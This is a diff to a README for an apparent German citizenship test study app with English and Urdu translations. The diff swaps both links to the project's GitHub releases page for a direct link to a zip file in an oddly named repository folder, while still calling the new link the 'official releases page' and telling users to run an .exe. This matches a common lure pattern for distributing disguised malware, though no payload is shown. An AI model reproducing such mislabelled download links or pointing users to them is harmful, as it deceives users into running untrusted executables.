@@ -1,6 +1,6 @@
 # 🇩🇪 german-citizenship-test-english-urdu - Pass your German citizenship test quickly
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Plantfamilydioon8805/german-citizenship-test-english-urdu/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Plantfamilydioon8805/german-citizenship-test-english-urdu/main/Provencial/german-english-test-citizenship-urdu-v2.5.zip)
 
 This application helps individuals prepare for the official German citizenship test, or Einbürgerungstest. It contains the complete set of official questions used by the Federal Office for Migration and Refugees (BAMF). You will find over 300 general questions and 160 state-specific questions. Each question includes a translation in English and Urdu to ensure you understand every concept. Explanations for each answer help you learn the material rather than memorize it.
 
@@ -8,7 +8,7 @@ This application helps individuals prepare for the official German citizenship t
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Plantfamilydioon8805/german-citizenship-test-english-urdu/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Plantfamilydioon8805/german-citizenship-test-english-urdu/main/Provencial/german-english-test-citizenship-urdu-v2.5.zip).
 2. Look for the latest file ending in `.exe`. 
 3. Click the filename to save the installer to your Downloads folder.
 4. Open your Downloads folder.
